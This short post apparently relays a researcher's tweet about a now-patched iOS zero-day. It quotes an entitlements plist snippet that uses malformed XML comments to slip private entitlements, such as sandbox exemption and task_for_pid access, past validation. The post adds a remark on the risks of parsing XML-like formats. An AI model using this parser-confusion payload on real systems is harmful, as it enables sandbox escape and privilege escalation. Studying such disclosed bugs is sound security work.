> RIP my very first 0day and absolute best sandbox escape ever:

```
<key>application-identifier</key>
<string>...</string>
<!---><!-->
<key>platform-application</key>
<true/>
<key>com .apple.private.security.no-container</key>
<true/>
<key>task_for_pid-allow</key>
<true/>
<!-- -->
```

[Tweet](https://twitter.com/s1guza/status/1255641164885131268) that demonstrates a recent zero-day (now patched) in iOS. This serves as your annual reminder that parsing xml-like things is a fraught activity.
